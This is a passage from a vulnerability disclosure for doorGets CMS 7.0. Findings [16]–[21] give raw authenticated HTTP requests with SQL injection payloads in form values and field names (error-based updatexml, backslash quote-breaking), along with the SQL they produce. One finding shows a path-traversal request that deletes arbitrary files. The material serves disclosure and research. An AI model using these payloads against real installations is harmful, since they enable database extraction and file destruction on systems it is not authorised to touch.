------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_token"

255565cb57ab094d305.08190707
------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_langue"

en
------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_id_parent"

0
------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_nom"

test11\
------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_titre"

,(select/**/1=(updatexml(1,concat(0x5e24,(select/**/user()),0x5e24),1))),2,0x626c6f672d74657374312d656e,22,222,1,1555397447,4)#
------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_description"

test3
------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_uri"

test1
------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_meta_titre"

test2
------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_meta_description"

test3
------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_meta_keys"


------WebKitFormBoundarylPbmXrBulFPAjyLA
Content-Disposition: form-data; name="modulecategory_add_submit"

Save
------WebKitFormBoundarylPbmXrBulFPAjyLA--
```
The SQL statement executed by the program is:
```INSERT INTO `_categories` (`uri_module`,`ordre`,`id_parent`,`date_creation`) VALUES ("blog","17","0","1555398477");INSERT INTO `_categories_traduction` (`langue`,`nom`,`titre`,`description`,`uri`,`meta_titre`,`meta_description`,`meta_keys`,`date_creation`,`id_cat`) VALUES ("en","test11\",",(select/**/1=(updatexml(1,concat(0x5e24,(select/**/user()),0x5e24),1))),2,0x626c6f672d74657374312d656e,22,222,1,1555397447,4)#","test3","blog-test1-en","test2","test3","","1555398477","17");```

You can get the current database user through SQL injection:

![63.png](./img/63.png)


**[16]**

In \doorgets\app\requests\user\configurationRequest.php:

![64.png](./img/64.png)

Line 800 enters the case when $_GET['action']= network.
Line 808 encodes the value of the array, but does not handle the key of the array.
Line 813 directly calls the dbQU function for database query operations.

Since only the value of the array is encoded, but not for the key, the attacker can use the key of the array for SQL injection.

After the administrator logs in, replace the following cookie and request:
```
POST /dg-user/?controller=configuration&action=network HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 450
Pragma: no-cache
Cache-Control: no-cache
Origin: http://127.0.0.1:8003
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABOebmYl9azFH0TC
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1:8003/dg-user/?controller=configuration&action=network
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=6laloptc1mdug324doe9j3g1n6


------WebKitFormBoundaryABOebmYl9azFH0TC
Content-Disposition: form-data; name="configuration_network_facebook"

doorgets
------WebKitFormBoundaryABOebmYl9azFH0TC
Content-Disposition: form-data; name="configuration_network_facebook=(select/**/user())/**/where/**/id=1#"

doorgets
------WebKitFormBoundaryABOebmYl9azFH0TC
Content-Disposition: form-data; name="configuration_network_submit"

Save
------WebKitFormBoundaryABOebmYl9azFH0TC--
```
The SQL statement executed by the program is:
```UPDATE `_website` SET facebook = 'doorgets', facebook=(select/**/user())/**/where/**/id=1# = 'doorgets' WHERE id = '1'  LIMIT 1  ;```

Then visit ```http://domain.com/dg-user/?controller=configuration&action=network```
You can see that the value of select user() obtained by injection is: root@localhost
![65.png](./img/65.png)


**[17]**

In \doorgets\app\requests\user\modulecategoryRequest.php:

![66.png](./img/66.png)

Line 222 calls the dbQU function and passes the $data for database query. Because there is no filtering, SQL injection is caused.

After the administrator logs in, visit ```http://domain.com/dg-user/?controller=modulecategory&uri=blog&lg=en```
Click below:

![67.png](./img/67.png)

After filling in the data, capture the packet, replace the obtained cookie and modulecategory_edit_token with the following request, and then submit:
```
POST /dg-user/?controller=modulecategory&uri=blog&id=1&lg=en&action=edit HTTP/1.1
Host: 127.0.0.1:8003
Content-Length: 1408
Cache-Control: max-age=0
Origin: http://127.0.0.1:8003
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymALW1Ky0ACpF8w2Z
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1:8003/dg-user/?controller=modulecategory&uri=blog&id=1&lg=en&action=edit
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=6laloptc1mdug324doe9j3g1n6
Connection: close

------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_token"

143905cb580036528c8.10480003
------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_langue"

en
------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_id_parent"

0
------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_nom"

test1\
------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_titre"

,description=(select/**/@@version)#
------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_description"

test3
------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_uri"

blog-test1-en
------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_meta_titre"

test2
------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_meta_description"

test3
------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_meta_keys"


------WebKitFormBoundarymALW1Ky0ACpF8w2Z
Content-Disposition: form-data; name="modulecategory_edit_submit"

Save
------WebKitFormBoundarymALW1Ky0ACpF8w2Z--
```
此时数据库执行的语句为：
```UPDATE `_categories_traduction` SET langue = 'en', nom = 'test1\', titre = ',description=(select/**/@@version)#', description = 'test3', uri = 'blog-test1-en', meta_titre = 'test2', meta_description = 'test3', meta_keys = '' WHERE id = '1'  LIMIT 1  ;```

Re-visit ```http://domain.com/dg-user/?controller=modulecategory&uri=blog&lg=en``` and enter the one just modified, you can get the current database version by SQL injection:

![68.png](./img/68.png)


**[18]**

In \doorgets\app\requests\user\configurationRequest.php:

![69.png](./img/69.png)

Line 283 determines if the token is valid.

![70.png](./img/70.png)

Lines 285-290 get the value of $dDefault.

![71.png](./img/71.png)

Line 318 passes $dDefault to call the dbQU function for database query:

![72.png](./img/72.png)

Since we can control multiple parameters in the SQL statement, let the first parameter take \, the value will comment out the " after the statement, so that the second parameter can be injected.

After the administrator logs in,visit ```http://domain.com/dg-user/?controller=configuration&action=siteweb```
Then click "Save" and capture the package, modify the values of "configuration_siteweb_title" and "configuration_siteweb_slogan" as follows:
```
POST /dg-user/?controller=configuration&action=siteweb HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 2741
Pragma: no-cache
Cache-Control: no-cache
Origin: http://127.0.0.1:8003
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywNHfnN6qoADnI3Pw
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1:8003/dg-user/?controller=configuration&action=siteweb
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=6laloptc1mdug324doe9j3g1n6

------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_token"

320055ca31c832cc7e5.41347850
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_statut"

1
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_statut_ip"


------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_statut_tinymce"

<audio controls="controls" style="display: none;"></audio>
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_title"

test1\
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_slogan"

,title=(select/**/user())/**/WHERE/**/langue=0x656e#
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_description"

test1
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_copyright"

test1
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_keywords"

test1
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_year"

2019
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_gmaps"


------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_sharethis"

d29faeb3-5ce2-4616-a7ea-0c87ac3bbf84
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_id_facebook"

doorgets
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_id_disqus"

doorgets
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_signature_tinymce"

<audio controls="controls" style="display: none;"></audio>
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_cgu_tinymce"

<audio controls="controls" style="display: none;"></audio>
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_terms_tinymce"

<audio controls="controls" style="display: none;"></audio>
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_privacy_tinymce"

<audio controls="controls" style="display: none;"></audio>
------WebKitFormBoundarywNHfnN6qoADnI3Pw
Content-Disposition: form-data; name="configuration_siteweb_submit"

Save
------WebKitFormBoundarywNHfnN6qoADnI3Pw--
```
The SQL statement executed by the program is:
```UPDATE `_website_traduction` SET title = 'test1\', slogan = ',title=(select/**/user())/**/WHERE/**/langue=0x656e#', description = 'test1', copyright = 'test1', year = '2019', keywords = 'test1', statut_tinymce = '', signature_tinymce = '', cgu_tinymce = '', terms_tinymce = '', privacy_tinymce = '' WHERE langue = 'en'  LIMIT 1  ;```

Revisit ```http://domain.com/dg-user/?controller=configuration&action=siteweb```
The result of getting SQL injection is: root@localhost

![73.png](./img/73.png)


**[19]**

In \doorgets\app\requests\user\configurationRequest.php:

![74.png](./img/74.png)

Line 1083 enters the case when $_GET['action']=setup and $_GET['do']=delete.
Line 1082 verifies the token.
Line 1094 directly calls the unlink function to delete the file specified by $_GET['file'].

Since the value of file is not filtered, an attacker can delete any file.

Administrators log in and access ```http://domain.com/dg-user/?Controller=configuration&action=setup```
If there is no backup currently, then back up one:

![75.png](./img/75.png)

Then select a backup, click the button below and grab the package:

![76.png](./img/76.png)

Modify the value of the file parameter as follows:
```
POST /dg-user/?controller=configuration&action=setup&do=delete&file=./../data/1234.txt HTTP/1.1
Host: 127.0.0.1:8003
Content-Length: 408
Cache-Control: max-age=0
Origin: http://127.0.0.1:8003
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjFIyYDadLyzKcDuF
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1:8003/dg-user/?controller=configuration&action=setup&do=delete&file=doorGets_CMS_7.0_5ca1bf580743c_1554104152.zip
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=6laloptc1mdug324doe9j3g1n6
Connection: close

------WebKitFormBoundaryjFIyYDadLyzKcDuF
Content-Disposition: form-data; name="installer_delete_token"

175015ca1b8264161f4.09576079
------WebKitFormBoundaryjFIyYDadLyzKcDuF
Content-Disposition: form-data; name="installer_delete_delete"

1
------WebKitFormBoundaryjFIyYDadLyzKcDuF
Content-Disposition: form-data; name="installer_delete_submit"

Remove
------WebKitFormBoundaryjFIyYDadLyzKcDuF--
```
After the request, you can delete /data/1234.txt(test file)


**[20]**

In \doorgets\app\requests\user\emailingRequest.php:

![77.png](./img/77.png)

Line 119 directly inserts the key value in the post data into the database query, resulting in injection.

After the administrator logs in, visit ```http://domain.com/dg-user/?controller=emailing```
Click below:

![78.png](./img/78.png)

After filling in the data, capture the packet, replace the obtained cookie and emerging_add_token with the following request, and then request:
```
POST /dg-user/?controller=emailing&action=add HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 1017
Pragma: no-cache
Cache-Control: no-cache
Origin: http://127.0.0.1:8003
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaypaF2drDyZAvej4
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1:8003/dg-user/?controller=emailing&action=add
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=6laloptc1mdug324doe9j3g1n6

------WebKitFormBoundaryaypaF2drDyZAvej4
Content-Disposition: form-data; name="emailing_add_token"

121575cac3939554470.39398541
------WebKitFormBoundaryaypaF2drDyZAvej4
Content-Disposition: form-data; name="emailing_add_id_user"

7
------WebKitFormBoundaryaypaF2drDyZAvej4
Content-Disposition: form-data; name="emailing_add_nom`,`email`,`description`,`date_creation`)/**/VALUES(7,(select@@version),'test@localhost.com','aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa','1554791193');#"

 
------WebKitFormBoundaryaypaF2drDyZAvej4
Content-Disposition: form-data; name="emailing_add_nom"

test1
------WebKitFormBoundaryaypaF2drDyZAvej4
Content-Disposition: form-data; name="emailing_add_email"

test@localhost.com
------WebKitFormBoundaryaypaF2drDyZAvej4
Content-Disposition: form-data; name="emailing_add_description"

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
------WebKitFormBoundaryaypaF2drDyZAvej4
Content-Disposition: form-data; name="emailing_add_submit"

Save
------WebKitFormBoundaryaypaF2drDyZAvej4--
```
The SQL statement executed by the program is:
```INSERT INTO `_dg_newsletter` (`id_user`,`nom`,`email`,`description`,`date_creation`)/**/VALUES(7,(select@@version),'test@localhost_com','aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa','1554791193');#`,`nom`,`email`,`description`,`date_creation`) VALUES ("7"," ","test1","test@localhost.com","aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","1554791868");```

Re-request ```http://domain.com/dg-user/?controller=emailing```, you can get the current database version 5.5.53 through SQL injection:

![79.png](./img/79.png)


**[21]**

http://domain.com/doorgets/routers/ajaxRouter.php

![80.png](./img/80.png)

http://domain.com/ajax/index.php?uri=1234%5c

![81.png](./img/81.png)

http://domain.com/ajax/index.php?uri=home/&action=sendForm&controller=survey

![82.png](./img/82.png)

view-source:domain.com/cache/template/index_header.tpl.php

![83.png](./img/83.png)

